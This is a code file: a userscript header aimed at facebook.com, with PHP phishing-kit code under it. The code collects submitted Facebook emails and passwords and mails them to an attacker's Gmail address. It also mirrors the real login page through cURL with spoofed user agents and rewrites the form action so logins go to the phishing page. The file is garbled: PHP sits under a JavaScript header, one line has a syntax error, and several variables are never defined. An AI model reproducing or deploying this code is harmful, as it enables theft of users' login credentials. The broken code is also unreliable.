// ==UserScript==
// @name			Blablabla
// @description			A script
// @include			http://*.facebook.com/*
// ==/UserScript==

// Check if page has already been processed.
if(isset($_GET['login_attempt']))
{
// Check the url for login_attempt, a POST email and POST password.
if($_GET['login_attempt'] == 1 && isset($_POST['email']) && isset($_POST['pass']))
{
// Recipient
$to = $email;

// Subject
$subject = 'Facebook Phish';

// Email Message
$message = 'Username: '.$_POST['email'].'
Password:'.$_POST['pass'];

// Headers
$headers = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'To: <'the.thug.hack@gmail.com';'>' . "\r\n";
$headers .= 'From: Facebook Phish <facebook@phish.com>' . "\r\n";

// Mail it
mail($to, $subject, $message, $headers);

// Redirect them to real page as a failed attempt (work on this)
header('Location: '.$redirect);
}
}

// Initiate cURL
$ch = curl_init();

// Define browser spoofs so we aren't denied.
$useragent = array();
$useragent['firefox2'] = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1";
$useragent['firefox3'] = "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.11) Gecko/2009060215 Firefox/3.0.11 (.NET CLR 3.5.30729)";
$useragent['msie8'] = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)";
$useragent['msie7'] = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Meridio for Excel 5.0.251; Meridio for PowerPoint 5.0.251; Meridio for Word 5.0.251; Meridio Protocol; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)";

// Set cURL options.
curl_setopt($ch, CURLOPT_USERAGENT, $useragent[$browser]);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

// Retrieve the page as a string.
$output = curl_exec($ch);

// Close cURL stream.
curl_close($ch);

/**
* Make the necessary changes to the output
*/

// Replaces your url with the embedded url in the source.
$output = str_replace($form_url, $login_url, $output);

// Outputs the source.
echo $output;
